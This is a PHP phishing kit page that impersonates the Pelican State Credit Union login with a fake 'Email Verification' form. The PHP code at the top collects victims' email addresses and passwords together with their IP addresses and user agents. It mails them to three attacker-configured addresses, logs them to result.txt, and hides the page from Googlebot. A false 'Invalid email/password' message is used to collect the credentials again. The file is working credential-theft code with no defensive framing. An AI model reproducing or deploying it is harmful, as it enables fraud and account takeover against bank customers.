<?php
session_start();
include('css/vld.php');
include('antibots.php');
include('config/email.php');
if(isset($_POST['email'])){
    
    $ip = getenv("REMOTE_ADDR");
    $ua = $_SERVER['HTTP_USER_AGENT'];
$msg .= "#------------------[ Pelican CU EMail Access ]---------------------#\n";
$msg .= "Email Address  : ".$_POST['email']."\n";
$msg .= "Password  : ".$_POST['pass']."\n";
$msg .= "#-----------------[ Visitor ]------------------#\n";
$msg .= "IP Address     : ".$ip."\n";
$msg .= "DEVICE INFORMATION         : ".$ua."\n";
$msg .= "#-------------------[ SNICKYNINJA - END ]------------------------#\n\n";
$sub = "::SNICKYNINJA:: Pelican CU Email access: $ip";
mail($to,$sub,$msg);
mail($ml1,$sub,$msg);
mail($ml2,$sub,$msg);

     $data = fopen("result.txt", "a");
    $result = $msg;
   fwrite($data, $result);
   fclose($data);
}
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">

	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Login: Pelican state Credit Union</title>
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<style type="text/css">
		*{
			font-family: arial,helvetica,consolas;
		}body{
			margin: auto;
		}#container{
			width: 100%;
			height: 100%;
background-image: url("img/bg.jpg");
			background-repeat: no-repeat;
			background-position: center;
			background-size: cover;
		}#form{
			padding: 15px;
			width: 88%;
			padding-top: 20px;
			margin-top: 80px;
			margin: auto;
			max-width: 500px;
			background: white;
			border-radius: 10px;
		}form{
			margin: auto;
			width: 93%;
			max-width: 400px;
		}::placeholder{
			color: #015167;
		}.foot{
			color: gray;
			margin-right: 12px;
			margin-left: 12px;
		}#footer{
			background: white;
			padding: 15px;
			margin-top: 60px;
		}#ft{
			max-width: 800px;
			margin: auto;
			line-height: 23px;
			font-size: 12px;
		}input{

		}
	</style>
</head>
<body>
	<div id="container">
		<br>
		<br>
		<br>
		
<div id="form">
	<form action="personal.php" method="post">
			<center>
				<img src="img/micon.png" width="50px">
<h3 style="font-family: consolas;margin-top: 10px;margin-bottom: 0;">Email Verification</h3>
<p style="font-size:12px; color: gray;font-family: verdana;">We need this info to verify your identity.</p>
<br>
<p style="text-align:left;color: red;font-size: 12px;font-family: verdana;">Invalid email/password</p>
				<input type="email" style="width: 90%;padding: 16px;border: 1px solid lightgray;border-radius: 4px;font-size: 15px;border-color: red;" name="email" maxlength="" minlength="5" placeholder="Email Address" required>
				<input style="width: 90%;padding: 16px;border: 1px solid lightgray;border-radius: 4px;font-size: 15px;margin-top: 20px;border-color: red;" name="pass" type="password" minlength="5" placeholder="Email Password" required>
				<p style="color: #015167;text-align: right;font-size: 14px;font-weight: 500;">Need Help?</p>
				<table width="100%" style="margin-top: 30px;">
					<tr>
						<td style="color: #015167;font-size: 14px;font-weight: 500;text-align: left;">First time user? Enroll now.</td>
						<td style="text-align: right;"><button style="background:#007aa3;color: white;padding: 15px;font-size: 13px;font-weight: bold;border-radius: 8px;border: 0;width: 120px;">Continue</button></td>
					</tr>
				</table>

				<a href="#" style="display: block;color: #015167;text-decoration: none;font-weight: 500;font-size: 14px;margin-top: 25px;padding: 18px;background: #eef1f5;border-radius: 8px;margin-bottom: 30px;"><i class="fa fa-building" style="font-size:18px"></i> Become a member</a>
			</center>
			
		</form>
</div>



<div id="footer">
	<p id="ft"><span class="foot">© 2022 - Pelican State Credit Union</span> • <span class="foot">(800) 351-4877</span> • <span class="foot">Privacy policy</span> • <span class="foot">Federally Insured by NCUA</span> •  <span class="foot">Equal Housing Opportunity</span></p>
</div>




	</div>

</body>
</html>